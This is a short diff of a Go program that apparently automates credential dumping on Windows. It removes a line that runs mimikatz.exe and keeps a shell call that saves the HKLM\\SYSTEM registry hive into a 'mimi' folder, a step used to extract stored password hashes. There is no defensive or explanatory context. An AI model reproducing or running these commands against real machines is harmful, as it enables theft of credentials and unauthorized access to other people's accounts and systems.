@@ -22,10 +22,6 @@ func main() {
 		panic(err)
 		return
 	}
-	stdout, _, err := shell.Execute("/mimikatz.exe")
-	if err != nil {
-		panic(err.Error())
-	}
 	stdout, stderr, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system.hiv")
 	if err != nil {
 		panic(err.Error())
